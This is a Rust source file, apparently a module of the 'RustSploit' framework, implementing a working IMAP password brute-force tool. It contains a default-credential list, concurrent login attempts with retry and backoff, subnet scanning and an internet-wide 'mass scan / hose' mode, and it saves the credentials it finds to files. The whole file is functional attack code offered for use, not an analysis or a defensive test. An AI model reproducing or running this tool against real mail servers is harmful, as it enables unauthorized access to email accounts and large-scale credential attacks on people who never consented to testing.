use anyhow::{anyhow, Result};
use colored::*;
use native_tls::TlsConnector;
use std::io::{Read, Write};
use std::net::IpAddr;
use std::time::Duration;

use crate::utils::{
    load_lines, get_filename_in_current_dir,
    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range,
    cfg_prompt_output_file,
};
use crate::modules::creds::utils::{
    BruteforceConfig, LoginResult, SubnetScanConfig,
    generate_combos, run_bruteforce, run_subnet_bruteforce,
    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
    backoff_delay,
};

// ============================================================================
// Constants
// ============================================================================

const DEFAULT_IMAP_PORT: u16 = 143;
const DEFAULT_IMAPS_PORT: u16 = 993;

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", ""),
    ("root", "root"),
    ("root", "password"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("info", "info"),
    ("mail", "mail"),
    ("postmaster", "postmaster"),
];

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "IMAP Brute Force".to_string(),
        description: "Brute-force IMAP authentication using raw TCP protocol with TLS/IMAPS \
            support. Sends IMAP LOGIN commands, handles greeting banners, and supports \
            default credential testing, combo mode, concurrent connections, and subnet/mass \
            scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://datatracker.ietf.org/doc/html/rfc3501".to_string(),
        ],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Error Classification
// ============================================================================

#[derive(Debug, Clone, PartialEq)]
enum ImapErrorType {
    AuthenticationFailed,
    ConnectionRefused,
    ConnectionTimeout,
    TlsError,
    ProtocolError,
    Unknown,
}

impl ImapErrorType {
    fn classify_error(msg: &str) -> Self {
        let lower = msg.to_lowercase();
        if lower.contains("authentication")
            || lower.contains("login")
            || lower.contains("invalid credential")
            || lower.contains("a001 no")
        {
            Self::AuthenticationFailed
        } else if lower.contains("refused")
            || lower.contains("reset")
            || lower.contains("broken pipe")
        {
            Self::ConnectionRefused
        } else if lower.contains("timeout")
            || lower.contains("timed out")
            || lower.contains("deadline")
        {
            Self::ConnectionTimeout
        } else if lower.contains("tls")
            || lower.contains("ssl")
            || lower.contains("certificate")
            || lower.contains("handshake")
        {
            Self::TlsError
        } else if lower.contains("protocol") || lower.contains("unexpected") || lower.contains("banner") {
            Self::ProtocolError
        } else {
            Self::Unknown
        }
    }

    fn is_retryable(&self) -> bool {
        matches!(self, Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::AuthenticationFailed => "Authentication failed",
            Self::ConnectionRefused => "Connection refused/reset",
            Self::ConnectionTimeout => "Connection timed out",
            Self::TlsError => "TLS/SSL error",
            Self::ProtocolError => "Protocol error",
            Self::Unknown => "Unknown error",
        }
    }
}

#[derive(Debug)]
struct ImapError {
    error_type: ImapErrorType,
    message: String,
}

impl std::fmt::Display for ImapError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[{}] {}", self.error_type.description(), self.message)
    }
}

impl std::error::Error for ImapError {}

impl ImapError {
    fn from_anyhow(err: anyhow::Error) -> Self {
        let msg = err.to_string();
        let error_type = ImapErrorType::classify_error(&msg);
        Self { error_type, message: msg }
    }
}

// ============================================================================
// Module Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("\n{}", "=== IMAP Bruteforce Module (RustSploit) ===".bold().cyan());
    crate::mprintln!();

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let use_tls = cfg_prompt_yes_no("use_tls", "Use TLS/IMAPS?", false).await?;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = std::sync::Arc::new(load_lines(&usernames_file)?);
        let passes = std::sync::Arc::new(load_lines(&passwords_file)?);
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        return run_mass_scan(target, MassScanConfig {
            protocol_name: "IMAP",
            default_port: if use_tls { DEFAULT_IMAPS_PORT } else { DEFAULT_IMAP_PORT },
            state_file: "imap_hose_state.log",
            default_output: "imap_mass_results.txt",
            default_concurrency: 500,
        }, move |ip: IpAddr, port: u16| {
            let users = users.clone();
            let passes = passes.clone();
            async move {
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
                    return None;
                }

                let target_str = ip.to_string();
                for user in users.iter() {
                    for pass in passes.iter() {
                        let mut retry_attempt: u32 = 0;
                        let max_retries: u32 = 3;
                        let mut should_skip_host = false;
                        loop {
                            let t = target_str.clone();
                            let u = user.clone();
                            let p = pass.clone();
                            let res = tokio::task::spawn_blocking(move || {
                                attempt_imap_login(&t, port, &u, &p, use_tls, 5)
                            }).await;
                            match res {
                                Ok(Ok(true)) => {
                                    let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                    let line = format!("[{}] {}:{}:{}:{}\n", now, ip, port, user, pass);
                                    crate::mprintln!("\r{}", format!("[+] FOUND: {}:{}:{}:{}", ip, port, user, pass).green().bold());
                                    return Some(line);
                                }
                                Ok(Ok(false)) => break, // auth failed, try next
                                Ok(Err(e)) => {
                                    if e.error_type.is_retryable() && retry_attempt < max_retries {
                                        retry_attempt += 1;
                                        let delay = backoff_delay(500, retry_attempt, 8);
                                        tokio::time::sleep(delay).await;
                                        continue;
                                    }
                                    should_skip_host = true;
                                    break;
                                }
                                Err(_) => {
                                    should_skip_host = true;
                                    break;
                                }
                            }
                        }
                        if should_skip_host {
                            return None;
                        }
                    }
                }
                None
            }
        }).await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let use_tls = cfg_prompt_yes_no("use_tls", "Use TLS/IMAPS?", false).await?;
        let default_port = if use_tls { DEFAULT_IMAPS_PORT } else { DEFAULT_IMAP_PORT };
        let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "imap_subnet_results.txt").await?;

        let connection_timeout: u64 = 5;

        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "imap",
            source_module: "creds/generic/imap_bruteforce",
            skip_tcp_check: false,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            async move {
                let target_str = ip.to_string();
                let res = tokio::task::spawn_blocking(move || {
                    attempt_imap_login(&target_str, port, &user, &pass, use_tls, connection_timeout)
                }).await;
                match res {
                    Ok(Ok(true)) => LoginResult::Success,
                    Ok(Ok(false)) => LoginResult::AuthFailed,
                    Ok(Err(e)) => LoginResult::Error {
                        message: e.message,
                        retryable: e.error_type.is_retryable(),
                    },
                    Err(e) => LoginResult::Error {
                        message: format!("Task panic: {}", e),
                        retryable: false,
                    },
                }
            }
        }).await;
    }

    // --- Single Target Mode ---
    let use_tls = cfg_prompt_yes_no("use_tls", "Use TLS/IMAPS?", false).await?;
    let default_port = if use_tls { DEFAULT_IMAPS_PORT } else { DEFAULT_IMAP_PORT };
    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;

    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file = if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
        Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
    } else {
        None
    };

    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
        Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 256).await? as usize;
    let connection_timeout = cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 5, 1, 60).await? as u64;
    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries = if retry_on_error {
        cfg_prompt_int_range("max_retries", "Max retries per attempt", 2, 1, 10).await? as usize
    } else {
        0
    };
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "imap_brute_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every pass with every user)", false).await?;

    crate::mprintln!("\n{}", format!("[*] Starting brute-force on {}:{}", target, port).cyan());

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let combos = generate_combos(&usernames, &passwords, combo_mode);

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        async move {
            let res = tokio::task::spawn_blocking(move || {
                attempt_imap_login(&t, p, &user, &pass, use_tls, connection_timeout)
            }).await;
            match res {
                Ok(Ok(true)) => LoginResult::Success,
                Ok(Ok(false)) => LoginResult::AuthFailed,
                Ok(Err(e)) => LoginResult::Error {
                    message: e.message,
                    retryable: e.error_type.is_retryable(),
                },
                Err(e) => LoginResult::Error {
                    message: format!("Task panic: {}", e),
                    retryable: false,
                },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 0,
        max_retries,
        service_name: "imap",
        source_module: "creds/generic/imap_bruteforce",
    }, combos, try_login).await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored IMAP responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true).await? {
            let default_name = "imap_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            ).await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# IMAP Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// IMAP Protocol Functions
// ============================================================================

/// Attempt IMAP LOGIN authentication.
/// Connects, reads the greeting banner (* OK ...), sends LOGIN command,
/// and checks for A001 OK (success) or A001 NO (failure).
/// Returns Ok(true) on success, Ok(false) on auth rejection, Err on connection issues.
fn attempt_imap_login(
    target: &str,
    port: u16,
    user: &str,
    pass: &str,
    use_tls: bool,
    timeout_secs: u64,
) -> std::result::Result<bool, ImapError> {
    let addr = format!("{}:{}", target, port);
    let timeout = Duration::from_secs(timeout_secs);

    // IMAP LOGIN command: escape backslashes and quotes per RFC 3501 Section 9
    let escaped_user = user.replace('\\', "\\\\").replace('"', "\\\"");
    let escaped_pass = pass.replace('\\', "\\\\").replace('"', "\\\"");
    let login_cmd = format!("A001 LOGIN \"{}\" \"{}\"\r\n", escaped_user, escaped_pass);

    if use_tls {
        let connector = TlsConnector::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| ImapError {
                error_type: ImapErrorType::TlsError,
                message: e.to_string(),
            })?;

        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
            .map_err(|e| ImapError::from_anyhow(e.into()))?
            .next()
            .ok_or_else(|| ImapError {
                error_type: ImapErrorType::ConnectionRefused,
                message: "Resolution failed".to_string(),
            })?;

        let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
            .map_err(|e| ImapError::from_anyhow(e.into()))?;
        if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
        stream.set_read_timeout(Some(timeout)).map_err(|e| ImapError::from_anyhow(e.into()))?;
        stream.set_write_timeout(Some(timeout)).map_err(|e| ImapError::from_anyhow(e.into()))?;

        let mut stream = connector.connect(target, stream).map_err(|e| ImapError {
            error_type: ImapErrorType::TlsError,
            message: e.to_string(),
        })?;

        // Read IMAP greeting banner
        let mut buffer = [0u8; 2048];
        let n = stream.read(&mut buffer).map_err(|e| ImapError::from_anyhow(e.into()))?;
        let banner = String::from_utf8_lossy(&buffer[..n]);
        if !banner.contains("* OK") && !banner.contains("* PREAUTH") {
            return Err(ImapError {
                error_type: ImapErrorType::ProtocolError,
                message: format!("Unexpected IMAP banner: {}", banner.trim()),
            });
        }

        // Send LOGIN command
        stream.write_all(login_cmd.as_bytes())
            .map_err(|e| ImapError::from_anyhow(e.into()))?;

        let n = stream.read(&mut buffer).map_err(|e| ImapError::from_anyhow(e.into()))?;
        let response = String::from_utf8_lossy(&buffer[..n]);

        if response.contains("A001 OK") {
            // Clean logout
            if let Err(e) = stream.write_all(b"A002 LOGOUT\r\n") { crate::meprintln!("[!] IMAP LOGOUT write error: {}", e); }
            return Ok(true);
        }
        if response.contains("A001 NO") || response.contains("A001 BAD") {
            return Ok(false);
        }

        Err(ImapError {
            error_type: ImapErrorType::ProtocolError,
            message: format!("Unexpected LOGIN response: {}", response.trim()),
        })
    } else {
        // Plaintext IMAP connection
        let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
            .map_err(|e| ImapError::from_anyhow(e.into()))?
            .next()
            .ok_or_else(|| ImapError {
                error_type: ImapErrorType::ConnectionRefused,
                message: "Resolution failed".to_string(),
            })?;

        let mut stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
            .map_err(|e| ImapError::from_anyhow(e.into()))?;
        if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
        stream.set_read_timeout(Some(timeout)).map_err(|e| ImapError::from_anyhow(e.into()))?;
        stream.set_write_timeout(Some(timeout)).map_err(|e| ImapError::from_anyhow(e.into()))?;

        // Read IMAP greeting banner
        let mut buffer = [0u8; 2048];
        let n = stream.read(&mut buffer).map_err(|e| ImapError::from_anyhow(e.into()))?;
        let banner = String::from_utf8_lossy(&buffer[..n]);
        if !banner.contains("* OK") && !banner.contains("* PREAUTH") {
            return Err(ImapError {
                error_type: ImapErrorType::ProtocolError,
                message: format!("Unexpected IMAP banner: {}", banner.trim()),
            });
        }

        // Send LOGIN command
        stream.write_all(login_cmd.as_bytes())
            .map_err(|e| ImapError::from_anyhow(e.into()))?;

        let n = stream.read(&mut buffer).map_err(|e| ImapError::from_anyhow(e.into()))?;
        let response = String::from_utf8_lossy(&buffer[..n]);

        if response.contains("A001 OK") {
            // Clean logout
            if let Err(e) = stream.write_all(b"A002 LOGOUT\r\n") { crate::meprintln!("[!] IMAP LOGOUT write error: {}", e); }
            return Ok(true);
        }
        if response.contains("A001 NO") || response.contains("A001 BAD") {
            return Ok(false);
        }

        Err(ImapError {
            error_type: ImapErrorType::ProtocolError,
            message: format!("Unexpected LOGIN response: {}", response.trim()),
        })
    }
}
